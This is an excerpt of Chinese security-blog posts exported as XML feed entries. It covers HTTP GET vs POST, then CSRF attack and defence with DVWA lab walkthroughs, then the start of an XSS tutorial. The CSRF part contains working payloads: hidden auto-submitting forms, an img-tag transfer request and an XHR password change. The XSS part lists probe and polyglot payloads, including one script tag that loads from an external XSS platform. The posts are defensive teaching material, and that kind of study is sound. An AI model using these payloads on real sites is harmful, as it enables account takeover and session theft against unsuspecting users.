%E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。 POST提交：把提交的数据放置在是HTTP包的包体＜request-body＞中。 因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变2、传输数据的大小： 首先声明，HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。 而在实际开发中存在的限制主要有： GET：特定浏览器和服务器对URL长度有限制，例如IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系统的支持。 因此，对于GET提交时，传输数据就会受到URL长度的限制。 POST：由于不是通过URL传值，理论上数据不受限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。3、安全性： POST的安全性要比GET的安全性高。 注意：这里所说的安全性和上面GET提到的“安全”不是同个概念。上面“安全”的含义仅仅是不作数据修改，而这里安全的含义是真正的Security的含义。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存， (2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了。参考资料HTTP请求报文和HTTP响应报文HTTP协议详解HTTP 请求方法 | 菜鸟教程http请求报文格式和响应报文格式HTTP协议详解HTTP五大类响应类型含义]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF的攻击与防御原理]]></title>
    <url>%2Fposts%2F21bbd6b8.html%2F</url>
    <content type="text"><![CDATA[长风破浪会有时，直挂云帆济沧海 CSRF（Cross Site Request Forgery）跨站域请求伪造，是一种网络的攻击方式，它在2007年曾被列为互联网20大安全隐患之一,也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，也就是人们所知道的钓鱼网站。CSRF介绍 CSRF攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作，有很大的危害性。 尽管听起来跟XSS跨站脚本攻击有点相似，但事实上CSRF与XSS差别很大，XSS利用的是站点内的信任用户，而CSRF则是通过伪装来自受信任用户的请求来利用受信任的网站。 与XSS攻击相比，CSRF攻击往往不大流行，因此对其进行防范的资源也相当稀少和难以防范，所以CSRF被认为比XSS更具危险性。 上图为CSRF攻击的一个简单模型，用户访问恶意网站B，恶意网站B返回给用户的HTTP信息中要求用户访问网站A，而由于用户和网站A之间可能已经有信任关系导致这个请求就像用户真实发送的一样会被执行。CSRF的攻击原理1、用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；2、在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；3、用户在未退出网站A的情况下（cookie有效的情况），在同一浏览器中，打开了另一个网站B；4、网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问站点A，这个请求会带上浏览器端所保存的有效的站点A的cookie；5.、浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 因此，站点A会报据用户C的权限来处理恶意站点B所发起的请求，而这个请求可能以用户C的身份发送邮件、短信、消息，以及进行转账支付等操作，这样恶意站点B就达到了伪造用户C请求站点 A的目的。 受害者只需要做下面两件事情，攻击者就能够完成CSRF攻击：登录受信任站点 A，并在本地生成cookie；在不登出站点A（站点A的cookie有效）的情况下，访问恶意站点B。 看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击。”是的，确实如此，但你不能保证以下情况不会发生：1、你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。2、你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了。3、上图中所谓的攻击网站，很多情况下可能是一个存在其他漏洞（如XSS）的可信任且经常被人访问的网站。CSRF的攻击举例 假设某银行网站A以GET请求来发起转账操作，转账的地址为www.xxx.com/transfer.do？accountNum=l000l&amp;money=10000，参数accountNum表示转账的账户，参数money表示转账金额。而某大型论坛B上，一个恶意用户上传了一张图片，而图片的地址栏中填的并不是图片的地址，而是前而所说的砖账地址：&lt;img src=&quot;http://www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000&quot;&gt; 当你登录网站A后，没有及时登出，这时你访问了论坛B，不幸的事情发生了，你会发现你的账号里面少了10000块。 为什么会这样呢，在你登录银行A时，你的浏览器端会生成银行A的cookie，而当你访问论坛B的时候，页面上的&lt;img&gt;标签需要浏览器发起一个新的HTTP请求，以获得图片资源，当浏览器发起请求时，请求的却是银行A的转账地址www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000，并且会带上银行A的cookie信息，结果银行的服务器收到这个请求后，会以为是你发起的一次转账操作，因此你的账号里边便少了10000块。 当然，绝大多数网站都不会使用GET请求来进行数据更新，因此，攻击者也需要改变思路，与时俱进。 假设银行将其转账方式改成POST提交，而论坛B恰好又存在一个XSS漏洞，恶意用户在它的页面上植入如下代码：12345678&lt;form id="aaa" action="http://www.xxx.com/transfer.do" metdod="POST" display="none"&gt; &lt;input type="text" name="accountNum" value="10001"/&gt; &lt;input type="text" name="money" value="10000"/&gt;&lt;/form&gt;&lt;script&gt; var form = document.forms('aaa'); form.submit();&lt;/script&gt; 如果你此时恰好登录了银行A，且没有登出，当你打开上述页面后，脚本会将表单aaa提交，把accountNum和money参数传递给银行的转账地址http://www.xxx.com/transfer.do，同样的，银行以为是你发起的一次转账会从你的账户中扣除10000块。 当然，以上只是举例，正常来说银行的交易付款会有USB key、验证码、登录密码和支付密码等一系列屏障，流程比上述流程复杂得多，因此安全系数也高得多。DVWA下的CSRF攻击实验CSRF漏洞🔺Get方式利用漏洞确认：1、修改密码，没有对原密码进行验证，直接修改了， 判断缺少验证机制，可能存在CSRF2、确认referer无限制，无token1http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#漏洞利用：1、直接发送链接2、诱骗用户点击3、会弹出提示缺点：该利用方法，容易被用户发现。改进思路： 结合XSS，形成XSRF。用户触发XSS漏洞（存储型最佳），然后XSS漏洞执行script&lt;script src=&quot;修改密码的链接&quot;&gt;&lt;/script&gt;。前提是需要在用户访问概率高的网站上挖到XSS漏洞，或者欺骗用户访问钓鱼站点。改进流程：１、保持dvwa中csrf页面的登录（尾数129）２、部署一个csrf站点（尾数130），利用XSS(Stored);３、在130增加一个XSS埋伏1&lt;script src="http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#"&gt;&lt;/script&gt;４、重新用步骤3的密码123登录，观察效果。CSRF漏洞🔺Post方式利用使用CSRFTester思路环境准备：修改DVWA下CSRF漏洞的源码为POST方式提交找到/csrf的index.php，将get提交方式修改为post找到/csrf的low.php，将$＿GET修改为$＿REQUEST(说明:这个表示可以用get也可以用POST)测试是否成功修改POST提交方式POST方式提交，提交后URL不会出现具体的参数及参数值抓取POST提交方式的数据包通过OWASP CSRFTester抓包OWASP CSRFTester构建表单Forms，创建一个form表单。内容为hidden，用户不可见（可get、post）iFrame：创建一个iframe框架，高宽为0，用户不可见（可get、post ）IMG：创建一个IMG标签（只能get）XHR：创建一个AJAX请求（可get、post ）Link：创建一个a标签的超链接（只能get）修改上一步生产的index.html将文档放置在csrf站点，http://192.168.123.130/csrf/index.html测试1、保持dvwa在csrf的模块2、在同一个浏览器输入url，http://192.168.123.130/csrf/index.html，然后退出dvwa页面登录，测试密码是否为444，但是没有办法静默执行，因为会有提示使用Ajax思路通过Ajax，xmlrequest往表单里面提交数据环境准备：1、在dvwa上，同时存在csrf和xss2、在csrf站点上，制造ajax.html123456&lt;script&gt;xmlhttp=new XMLHttpRequest();xmlhttp.open(“POST”,http://192.168.123.129/dvwa/vulnerabilities/csrf/”,true);xmlhttp.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”);xmlhttp.send(“password_new=123456&amp;password_conf=123456”&amp;Change=Change”);&lt;/script&gt;http://192.168.123.130/csrf/ajax.html3、在dvwa下，利用反射型XSS更改密码1&lt;script src="http://192.168.123.130/csrf/ajax.html"&gt;&lt;/script&gt;此时密码已经修改4、用admin和password登录成功 如果在目标站点本身上存在XSS，则可以这样利用，使用&lt;script&gt;，&lt;img&gt;标签。但目标站点如果存在XSS，则直接利用XSS比利用CSRF更便捷。小结 GET方式，在用户活动状态下点击即可完成操作 POST方式，参数不能通过URL提交，需要构建表单，欺骗用户访问。该情况仍然结合XSS的比较多，或者直接诱骗用户访问攻击者自己搭建的钓鱼站点。CSRF漏洞检测😄 如何确认一个web系统存在CSRF漏洞呢，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。👉步骤1 对目标站点进行踩点，对增删改的地方进行标记，并观察其逻辑比如修改管理员账户时，不需要提供验证旧密码比如提交留言的动作，关注XX微博的动作等等👉步骤2 提交操作（get/post），观察http头部 的referer，并验证后台是否有referer限制比如使用抓包工具抓包，然后修改/删除referer后，重放， 看是否可以正常提交。👉步骤3 确认cookie的有效性（欺骗，或目标网 站存在漏洞）虽然退出或关闭了浏览器，但session并没有过期。 随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder。以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下： 使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。CSRF攻击的防御👍 目前防御CSRF攻击主要有三种策略：验证HTTP Referer字段；在请求地址中添加token并验证；在HTTP头中自定义属性并验证。验证HTTP Referer字段 根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的URL，通常是以bank.example域名开头的地址。而如果黑客要对银行网站实施CSRF攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的Referer是指向黑客自己的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。 这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心CSRF的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查Referer的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。 然而，这种方法并非万无一失。Referer的值可以抓包伪造修改，使得黑客完全可以把用户浏览器的Referer值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行CSRF攻击。 即便黑客无法篡改Referer值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心Referer值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供Referer。当他们正常访问银行网站时，网站会因为请求没有Referer值而认为是CSRF攻击，拒绝合法用户的访问。在请求地址中添加 token 并验证 现在业界对CSRF的防御，一致的做法是使用一个Token（Anti CSRF Token）。 CSRF攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的cookie 来通过安全验证。 要抵御CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于cookie之中。 可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。比如：1、用户访问某个表单页面。2、 服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。3、在页面表单附带上Token参数。4、用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。 这种方法要比检查Referer要安全一些，token可以在用户登陆后产生并放于session之中，然后在每次请求时把token从session中拿出，与请求中的token进行比对。token的值必须是随机的，不可预测的。有了token的存在，攻击者无法再构造一个带有合法token的请求实施CSRF攻击。另外使用token时应注意token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免token泄露。但这种方法的难点在于如何把token以参数的形式加入请求。 对于GET请求，token将附在请求地址之后，这样URL就变成 http://url?csrftoken=tokenvalue。 而对于POST请求来说，要在form的最后加上 &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;，这样就把token以参数的形式加入请求了。 但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上token是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用javascript遍历整个dom树，对于dom中所有的a和form标签后加入token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的html代码，这种方法就没有作用，还需要程序员在编码时手动添加token。 该方法还有一个缺点是难以保证token本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上token，黑客可以在自己的网站上得到这个token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加token的时候增加一个判断，如果这个链接是指向自己网站的，就在后面添加token，如果是通向其他的则不加。不过，即使这个csrftoken不以参数的形式附加在请求之中，黑客的网站也同样可以通过Referer来得到这个token值以发动CSRF攻击。这也是一些用户喜欢手动关闭浏览器Referer功能的原因。在 HTTP 头中自定义属性并验证 这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了上种方法在请求中加入token的不便，同时，通过XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，也不用担心token会透过Referer泄露到其他网站中去。 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于Ajax方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行CSRF防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为XMLHttpRequest请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。除了以上的三种主要防御CSRF攻击的策略之外，还有以下几种防御措施👇尽量使用POST，限制GET GET接口太容易被拿来做CSRF攻击，看第一个示例就知道，只要构造一个img标签，而img标签又是不能过滤的数据。 接口最好限制为POST使用，GET则无效，降低攻击风险。 当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。浏览器Cookie策略 IE6、7、8、Safari会默认拦截第三方本地Cookie（Third-party Cookie）的发送。 但是Firefox2、3、Opera、Chrome、Android等不会拦截，所以通过浏览器Cookie策略来防御CSRF攻击不靠谱，只能说是降低了风险。Cookie分为两种：Session Cookie（在浏览器关闭后，就会失效，保存到内存里）Third-party Cookie（即只有到了Exprie时间后才会失效的Cookie，这种Cookie会保存到本地） 另外如果网站返回HTTP头包含P3P Header，那么将允许浏览器发送第三方Cookie。加验证码 验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。 但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。CSRF与XSS的区别✌1、XSS是盗取用户cookie，从而进一步攻击，CSRF直接完成对受信任网站的攻击； XSS攻击条件比CSRF要简单，完成CSRF攻击要诸多条件；3、XSS是实现CSRF诸多条件的一种，这样的结合称为XSRF；4、XSS攻击很多时候是获取信息，不需要提前知道其他用户页面的代码和数据包。CSRF是代替用户完成指定的动作（直接完成攻击目标），需要构造出目标网站的URL结构。 XSS是攻击者偷了你车的钥匙后，用你的钥匙进入到你车，开你的车。 CSRF是让你自己用钥匙开门后，帮助攻击者开了你的车，并且你没有意识到这个操作。参考资料带你快速了解CSRF攻击与防御安全|常见的Web攻击手段之CSRF攻击CSRF攻击与防御]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
        <tag>跨站域请求伪造攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS的攻击原理与防御原理]]></title>
    <url>%2Fposts%2F9ee0c5.html%2F</url>
    <content type="text"><![CDATA[迟日江山丽，春风花草香 xss又称跨站脚本攻击，原称为css（Cross-Site Scripting），因为和层叠样式表(Cascading Style Sheets)重名，所以又称为xss(x一般有未知的含义，还有扩展的含义)。XSS的攻击原理 xss攻击涉及到了攻击者，用户和web server。主要是利用了网站本身设计的不严谨性，攻击者通过对网页插入恶意的攻击脚本，导致当用户在浏览网页的时候，嵌入其中的攻击脚本就会被执行，从而达到恶意攻击用户的特殊目的。攻击者通过xss攻击，可以获取到用户的cookie，然后发送给攻击者想要攻击的网站，因为跨站了，所以也称为跨站脚本攻击。XSS的分类 根据攻击的来源，xss攻击的分类主要分为：反射型xss、存储型xss和DOM型xss三种。反射型xss 反射型xss，也叫“非持久型xss”。用户点击攻击链接，触发了恶意脚本，服务器解析后响应，在返回的响应内容中出现攻击者的xss代码，被浏览器执行。一来一去，xss攻击脚本被web server反射回来给浏览器执行，所以称为反射型xss。反射型xss的攻击步骤： 1、攻击者构造出特殊的URL，其中包含恶意代码； 2、用户打开带有恶意代码的URL时，网站服务端将恶意代码从URL中取出，拼接在HTML中返回给浏览器； 3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行； 4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。特点： 1、攻击脚本非持久性，没有保存在web server中，而是直接出现在了URL地址中； 2、反射型xss漏洞常见于通过URL传递参数的功能，如网站搜索、跳转等； 3、由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。一般通过邮件、社交软件等方式直接发送攻击URL，通过用户的点击来达到攻击目的的。 POST的内容也可以触发反射型xss，只不过其触发条件比较苛刻，需要构造表单提交页面，并引导用户点击，所以非常少见。存储型xss 存储型xss，也叫“持久型xss”，相比反射型xss，存储型xss是把恶意脚本保存到了web server中的，这种攻击具有较强的稳定性和持久性，危害性也更大。这样每一个访问特定网页的用户，都会受到攻击。存储型xss的攻击步骤： 1、攻击者将恶意代码提交到目标网站的数据库中； 2、用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在HTML中返回给浏览器； 3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行； 4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。特点： 1、攻击脚本持久性，保存在web server中； 2、这种攻击常见于带有用户保存数据的网站功能，一般通过论坛发帖、商品评论、用户私信等功能（所有能够向web server输入内容的地方），将攻击脚本存储到web server中。 有时候反射型xss和存储型xss是同时使用的，比如：先通过对一个攻击url进行编码（来绕过xss filter），提交到web server（存储在web server中），然后用户在浏览页面时，如果点击该url，就会触发一个xss攻击。当然用户点击该url时，也可能会触发一个CSRF（Cross site request forgery）攻击。DOM型xss DOM（Document Object Model） –based 漏洞是基于文档对象模型的一种漏洞，通过修改页面的DOM节点而形成的xss漏洞。DOM型xss的攻击步骤： 1、攻击者构造出特殊的URL，其中包含恶意代码。 2、用户打开带有恶意代码的URL。 3、用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。 4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。特点： 1、攻击脚本不与服务端交互的，只与客户端上的js交互，攻击脚本放到了js中执行，然后显示出来； 2、DOM型xss也是一种反射型xss。小结 反射型xss跟存储型xss的区别是：存储型xss非持久性，攻击脚本存在服务器里，反射型xss持久性，攻击脚本存在URL里。 DOM型xss跟前两种xss的区别：DOM型xss，是通过修改页面的DOM节点来形成xss的，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种xss都属于服务端的安全漏洞。类型存储区插入点存储型 XSS后端数据库HTML反射型 XSSURLHTMLDOM型 XSS后端数据库/前端存储/URL前端 JavaScriptXSS漏洞的检测xss探针 xss探针可检测出网站有没有对xss漏洞做最基础的防御。 在测试xss的位置写入代码，查看页面源码，看看哪些代码被过滤或者转义了。1'';!--"&lt;XSS&gt;=&amp;&#123;()&#125;xss语句 除了xss探针以外，还可以输入最简单的测试语句1&lt;script&gt;alert(/xss/)&lt;/script&gt; 如果插入的语句原封不动的呈现在了浏览器中，那么说明：代码没有被过滤，存在xss；代码没有被执行，因为没有闭合类似textarea标签，可以查看下源码。常用的xss检测语句12345678910111213141516&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;script&gt;alert(/xss/)//&lt;script&gt;alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;&lt;/script&gt;//用分号，也可以分号+空格（回车一起使用）&lt;img src=1 onmouseover=alert(1)&gt;&lt;a herf=1 onload=alert(1)&gt;nmask&lt;/a&gt;&lt;script&gt;window.a==1?1:prompt(a=1)&lt;/script&gt;&lt;script&gt;a=prompt;a(1)&lt;/script&gt;&lt;img src=0 onerror=confirm('1')&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script src="http://xsspt.com/vA4t1W?1542101296"&gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;&lt;a href="javascript:alert(1)"&gt;xss&lt;/a&gt;&lt;svg onload=alert(1)&gt;&lt;input type="text" name="test" onclick=alert(1)&gt;&lt;iframe src="javascript:alert(/xss/)"&gt;xss&lt;/iframe&gt;&lt;iframe srcdoc="&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;"&gt;使用GIthub上的终极xss工具👉传送门1jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e 它能够检测到存在于HTML属性、HTML文字内容、HTML注释、跳转链接、内联JavaScript字符串、内联CSS 样式表等多种上下文中的XSS漏洞，也能检测 eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write()等DOMXSS漏洞，并且能绕过一些XSS过滤器。 只要在网站的各输入框中提交这个字符串，或者把它拼接到URL参数上，就可以进行检测了。自动化扫描工具 除了手动检测之外，还可以使用自动扫描工具寻找xss漏洞，例如 Arachni、Mozilla HTTP Observatory、w3af 等。XSS产生的原因 xss存在的根本原因是，对URL中的参数，对用户输入提交给web server的内容，没有进行充分的过滤。如果我们能够在web程序中，对用户提交的URL中的参数，和提交的所有内容，进行充分的过滤，将所有的不合法的参数和输入内容过滤掉，那么就不会导致在用户的浏览器中执行攻击者自己定制的脚本。 但是，其实充分而完全的过滤，实际上是无法实现的。因为攻击者有各种各样的神奇的，你完全想象不到的方式来绕过服务器端的过滤，最典型的就是对URL和参数进行各种的编码，比如escape，encodeURI，encodeURIComponent，8进制，10进制，16进制，来绕过xss过滤。那么我们如何来防御xss呢？XSS攻击的防御XSS 攻击有两大要素：1、攻击者提交恶意代码。2、浏览器执行恶意代码。 比较常规的思路是：对输入和URL参数进行过滤，对输出进行编码。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容。然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的xss攻击。XSS filter对输入和URL参数进行过滤（黑白名单），常用的xss filter的实现代码：123456789101112public class XssFilter implements Filter &#123; public void init(FilterConfig config) throws ServletException &#123;&#125; public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest)request); chain.doFilter(xssRequest, response); &#125; public void destroy() &#123;&#125;&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper &#123; HttpServletRequest orgRequest = null; public XssHttpServletRequestWrapper(HttpServletRequest request) &#123; super(request); orgRequest = request; &#125; /** * 覆盖getParameter方法，将参数名和参数值都做xss过滤。&lt;br/&gt; * 如果需要获得原始的值，则通过super.getParameterValues(name)来获取&lt;br/&gt; * getParameterNames,getParameterValues和getParameterMap也可能需要覆盖 */ @Override public String getParameter(String name) &#123; String value = super.getParameter(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * 覆盖getHeader方法，将参数名和参数值都做xss过滤。&lt;br/&gt; * 如果需要获得原始的值，则通过super.getHeaders(name)来获取&lt;br/&gt; * getHeaderNames 也可能需要覆盖 */ @Override public String getHeader(String name) &#123; String value = super.getHeader(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * 将容易引起xss漏洞的半角字符直接替换成全角字符 * * @param s * @return */ private static String xssEncode(String s) &#123; if (s == null || s.isEmpty()) &#123; return s; &#125; StringBuilder sb = new StringBuilder(s.length() + 16); for (int i = 0; i &lt; s.length(); i++) &#123; char c = s.charAt(i); switch (c) &#123; case '&gt;': sb.append('＞');// 全角大于号 break; case '&lt;': sb.append('＜');// 全角小于号 break; case '\'': sb.append('‘');// 全角单引号 break; case '\"': sb.append('“');// 全角双引号 break; case '&amp;': sb.append('＆');// 全角 break; case '\\': sb.append('＼');// 全角斜线 break; case '#': sb.append('＃');// 全角井号 break; case '%': // &lt; 字符的 URL 编码形式表示的 ASCII 字符（十六进制格式） 是: %3c processUrlEncoder(sb, s, i); break; default: sb.append(c); break; &#125; &#125; return sb.toString(); &#125; public static void processUrlEncoder(StringBuilder sb, String s, int index)&#123; if(s.length() &gt;= index + 2)&#123; if(s.charAt(index+1) == '3' &amp;&amp; (s.charAt(index+2) == 'c' || s.charAt(index+2) == 'C'))&#123; // %3c, %3C sb.append('＜'); return; &#125; if(s.charAt(index+1) == '6' &amp;&amp; s.charAt(index+2) == '0')&#123; // %3c (0x3c=60) sb.append('＜'); return; &#125; if(s.charAt(index+1) == '3' &amp;&amp; (s.charAt(index+2) == 'e' || s.charAt(index+2) == 'E'))&#123; // %3e, %3E sb.append('＞'); return; &#125; if(s.charAt(index+1) == '6' &amp;&amp; s.charAt(index+2) == '2')&#123; // %3e (0x3e=62) sb.append('＞'); return; &#125; &#125; sb.append(s.charAt(index)); &#125; /** * 获取最原始的request * * @return */ public HttpServletRequest getOrgRequest() &#123; return orgRequest; &#125; /** * 获取最原始的request的静态方法 * * @return */ public static HttpServletRequest getOrgRequest(HttpServletRequest req) &#123; if (req instanceof XssHttpServletRequestWrapper) &#123; return ((XssHttpServletRequestWrapper) req).getOrgRequest(); &#125; return req; &#125;&#125;然后在web.xml中配置该filter：12345678&lt;filter&gt; &lt;filter-name&gt;xssFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.xxxxxx.filter.XssFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;xssFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; 主要的思路就是将容易导致XSS攻击的边角字符替换成全角字符。&lt;和&gt;是脚本执行和各种html标签需要的，比如 &lt;script&gt;，&amp;和 #以及 %在对URL编码试图绕过xss filter时，会出现。我们说对输入的过滤分为白名单和黑名单。上面的xss filter就是一种黑名单的过滤，黑名单就是列出不能出现的对象的清单，一旦出现就进行处理。还有一种白名单的过滤，白名单就是列出可被接受的内容，比如规定所有的输入只能是大小写的26个英文字母和10个数字，还有-和_，所有其他的输入都是非法的，会被抛弃掉。很显然如此严格的白名单是可以100%拦截所有的xss攻击的，但是现实情况一般是不能进行如此严格的白名单过滤的。 对于输入，处理使用xss filter之外，对于每一个输入，在客户端和服务器端还要进行各种验证，验证是否合法字符，长度是否合法，格式是否正确。在客户端和服务端都要进行验证，因为客户端的验证很容易被绕过。其实这种验证也分为了黑名单和白名单。黑名单的验证就是不能出现某些字符，白名单的验证就是只能出现某些字符。尽量使用白名单，虽然白名单无法完全杜绝xss，但是使用不当的话可能会带来很高的误报率。存储型和反射型XSS攻击的防御 存储型和反射型xss都是在服务端取出恶意代码后，插入到响应HTML里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。预防这两种漏洞，有两种常见做法：改成纯前端渲染，把代码和数据分隔开。纯前端渲染的过程：1、浏览器先加载一个静态HTML，此HTML中不包含任何跟业务相关的数据。2、然后浏览器执行HTML中的JavaScript。3、JavaScript通过Ajax加载业务数据，调用DOM API更新到页面上。 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本.innerText，还是属性.setAttribute，还是样式.style等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。 但纯前端渲染还需注意避免DOM型xss漏洞，例如 onload 事件和 href 中的 javascript:xxx 